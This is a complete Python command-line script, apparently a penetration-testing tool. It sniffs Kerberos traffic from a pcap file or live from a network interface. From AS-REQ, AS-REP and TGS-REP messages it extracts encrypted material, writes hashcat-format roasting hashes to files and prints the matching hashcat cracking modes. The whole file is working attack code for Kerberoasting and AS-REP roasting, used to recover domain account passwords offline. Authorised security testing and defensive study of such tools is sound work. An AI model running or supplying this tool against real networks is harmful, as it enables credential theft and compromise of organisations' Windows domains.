#!/usr/bin/env python3

import argparse
import pyshark
import re

# Global flags (will be set in main)
VERBOSE = False
SHOW_HASHCAT_MODES = False

def safe_filename(s):
    # Replace all characters except letters, digits, dot, underscore, and hyphen with underscore
    return re.sub(r'[^A-Za-z0-9._-]', '_', s)

def vprint(*args, **kwargs):
    if VERBOSE:
        print(*args, **kwargs)

def hashcat_format_krb5tgs(etype, realm, spn, ciphertext):
    if etype == '17' or etype == '18':
        checksum_start = len(ciphertext) - 24
        checksum = ciphertext[checksum_start:]
        cipher = ciphertext[:checksum_start]
    elif etype == '23':
        checksum = ciphertext[:32]
        cipher = ciphertext[32:]
    else:
        checksum = ''
        cipher = ciphertext

    if etype == '17' or etype == '18':
        return f'$krb5tgs${etype}$*UNKNOWN_USERNAME${realm}${checksum}${cipher}'
    elif etype=='23':
        return f'$krb5tgs$23$*UNKNOWN_USERNAME${realm}${spn}*${checksum}${cipher}'

def parse_asreq_packet(packet):
    krb = packet.kerberos
    msg_type = krb.msg_type
    if msg_type != '10':
        return

    padata_types = []
    if hasattr(krb, 'padata_type'):
        if isinstance(krb.padata_type, list):
            padata_types = [ptype.show for ptype in krb.padata_type]
        else:
            padata_types = [krb.padata_type.show]

    if any(ptype == '2' for ptype in padata_types):
        username = krb.cnamestring if hasattr(krb, 'cnamestring') else None
        realm = krb.realm if hasattr(krb, 'realm') else None
        etype = krb.etype if hasattr(krb, 'etype') else None
        ciphertext = krb.cipher if hasattr(krb, 'cipher') else None

        if None in (username, realm, etype, ciphertext):
            print("[-] Incomplete AS-REQ packet, missing required fields.")
            return

        vprint("[+] Found AS-REQ with pA-ENC-TIMESTAMP")
        vprint(f"    User (cname): {username}")
        vprint(f"    Realm:        {realm}")
        vprint(f"    EType:        {etype}")
        vprint(f"    CipherText:   {ciphertext}")
        vprint()

        fmt = f"$krb5pa${etype}${username}${realm}${''.join(ciphertext.split(':'))}"
        safe_user = safe_filename(username)
        safe_realm = safe_filename(realm)
        filename = f"{safe_user}@{safe_realm}-{etype}-{''.join(ciphertext.split(':'))[:6]}.krb5pa"
        with open(filename, 'w') as f:
            f.write(fmt)
        vprint("=========================")
        vprint(fmt)
        vprint(f"=> {filename}")
        vprint("=========================")
        if not VERBOSE:
            print(f"[+] Found AS-REQ from {username} in realm {realm}")
            print(f"Saved hash in {filename}")
        if VERBOSE or SHOW_HASHCAT_MODES:
            if etype == '23':
                print("[!] hashcat -m 7500 ...  # RC4-HMAC")
            elif etype == '17':
                print("[!] hashcat -m 19800 ...  # AES128-CTS-HMAC-SHA1-96")
            elif etype == '18':
                print("[!] hashcat -m 19900 ...  # AES256-CTS-HMAC-SHA1-96")
        print()

def parse_asrep_packet(packet):
    krb = packet.kerberos
    msg_type = krb.msg_type
    if msg_type != '11':
        return

    username = krb.cnamestring if hasattr(krb, 'cnamestring') else None
    realm = krb.realm if hasattr(krb, 'realm') else None
    etype = None
    ciphertext = None

    if hasattr(krb, 'enc_part_etype'):
        etype = krb.enc_part_etype.show
    elif hasattr(krb, 'etype'):
        etype = krb.etype

    if hasattr(krb, 'enc_part_cipher'):
        ciphertext = krb.enc_part_cipher.show
    elif hasattr(krb, 'cipher'):
        ciphertext = krb.cipher

    if None in (username, realm, etype, ciphertext):
        print("[-] Incomplete AS-REP packet, missing required fields.")
        return

    vprint("[+] Found AS-REP")
    vprint(f"    User (cname): {username}")
    vprint(f"    Realm:        {realm}")
    vprint(f"    EType:        {etype}")
    vprint(f"    CipherText:   {ciphertext}")
    vprint()

    if etype == '23':
        fmt = f"$krb5asrep${username}@{realm}:{''.join(ciphertext.split(':'))}"
        safe_user = safe_filename(username)
        safe_realm = safe_filename(realm)
        filename = f"{safe_user}@{safe_realm}-asrep-{''.join(ciphertext.split(':'))[:6]}.krb5asrep"
        with open(filename, 'w') as f:
            f.write(fmt)
        vprint("=========================")
        vprint(fmt)
        vprint(f"=> {filename}")
        vprint("=========================")
        if not VERBOSE:
            print(f"[+] Found AS-REP from {username} in realm {realm}")
            print(f"Saved hash in {filename}")
        if VERBOSE or SHOW_HASHCAT_MODES:
            print("[!] hashcat -m 18200 ...  # RC4-HMAC")
    else:
        print(f"[-] AS-REP etype {etype} not supported for cracking with Hashcat.")
    print()

def parse_tgsrep_packet(packet):
    krb = packet.kerberos
    msg_type = krb.msg_type
    if msg_type != '13':
        return

    realm = None
    if hasattr(krb, 'realm'):
        realm = krb.realm
    elif hasattr(krb, 'crealm'):
        realm = krb.crealm

    etype = None
    if hasattr(krb, 'etype'):
        etype = krb.etype.show if hasattr(krb.etype, 'show') else krb.etype

    ciphertext = None
    if hasattr(krb, 'cipher'):
        ciphertext = krb.cipher.replace(':', '').upper()
    elif hasattr(krb, 'enc_part_cipher'):
        ciphertext = krb.enc_part_cipher.replace(':', '').upper()

    spn = None
    if hasattr(krb, 'snamestring'):
        try:
            if hasattr(krb.snamestring, 'all_fields') and len(krb.snamestring.all_fields) >= 2:
                spn_part_1 = krb.snamestring.all_fields[0].get_default_value()
                spn_part_2 = krb.snamestring.all_fields[1].get_default_value()
                spn = f'{spn_part_1}/{spn_part_2}'
            else:
                spn = str(krb.snamestring)
        except Exception:
            spn = str(krb.snamestring)
    else:
        spn = 'UNKNOWN_SPN'

    if None in (realm, etype, ciphertext):
        print("[-] Incomplete TGS-REP packet, missing required fields.")
        print()
        return

    vprint("[+] Found TGS-REP")
    vprint(f"    Realm:        {realm}")
    vprint(f"    EType:        {etype}")
    vprint(f"    SPN:          {spn}")
    vprint(f"    CipherText:   {ciphertext}")
    vprint()

    if etype in ('23', '17', '18'):
        fmt = hashcat_format_krb5tgs(etype, realm, spn, ciphertext)
        safe_spn = safe_filename(spn)
        safe_realm = safe_filename(realm)
        filename = f"{safe_spn}@{safe_realm}-tgsrep-{etype}-{ciphertext[:6]}.krb5tgs"
        with open(filename, 'w') as f:
            f.write(fmt)
        vprint("=========================")
        vprint(fmt)
        vprint(f"=> {filename}")
        vprint("=========================")
        vprint("Use hashcat mode for TGS-REP roasting:")
        if not VERBOSE:
            print(f"[+] Found TGS-REP for SPN {spn} in realm {realm}")
            print(f"Saved hash in {filename}")
        if VERBOSE or SHOW_HASHCAT_MODES:        
            if etype == '23':
                print("[!] hashcat -m 13100 ...  # RC4-HMAC")
            elif etype == '17':
                print("[!] hashcat -m 19600 ...  # AES128-CTS-HMAC-SHA1-96")
            elif etype == '18':
                print("[!] hashcat -m 19700 ...  # AES256-CTS-HMAC-SHA1-96") 
    else:
        print(f"[-] TGS-REP etype {etype} not supported for cracking with Hashcat.")
    print()

def parse_packet(packet):
    if not hasattr(packet, 'kerberos'):
        return
    krb = packet.kerberos
    msg_type = krb.msg_type
    if msg_type == '10':
        parse_asreq_packet(packet)
    elif msg_type == '11':
        parse_asrep_packet(packet)
    elif msg_type == '13':
        parse_tgsrep_packet(packet)

def capture_kerberos_tickets_from_file(filename):
    print(f"[*] Reading Kerberos packets from file: {filename}")
    cap = pyshark.FileCapture(filename, display_filter='kerberos')
    for packet in cap:
        parse_packet(packet)
    cap.close()

def capture_kerberos_tickets_live(interface):
    print(f"[*] Starting live capture on interface: {interface}")
    cap = pyshark.LiveCapture(interface=interface, display_filter='kerberos')

    try:
        for packet in cap.sniff_continuously():
            parse_packet(packet)
    except KeyboardInterrupt:
        print("[*] Stopped live capture.")
    finally:
        cap.close()

def main():
    global VERBOSE
    global SHOW_HASHCAT_MODES

    parser = argparse.ArgumentParser(description="Capture and process Kerberos packets for AS-REQ, AS-REP and TGS-REP roasting.")
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-m', '--show-modes', action='store_true', help='Show hashcat module hints')
    subparsers = parser.add_subparsers(dest='command', help='Subcommand to run')

    file_parser = subparsers.add_parser('file', help='Capture kerberos packets from a file')
    file_parser.add_argument('filename', help='The path to the pcap file')

    live_parser = subparsers.add_parser('live', help='Capture kerberos packets live from an interface')
    live_parser.add_argument('interface', help='Network interface for live capture')

    args = parser.parse_args()

    VERBOSE = args.verbose
    SHOW_HASHCAT_MODES = args.show_modes

    if args.command == 'file':
        capture_kerberos_tickets_from_file(args.filename)
    elif args.command == 'live':
        capture_kerberos_tickets_live(args.interface)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()

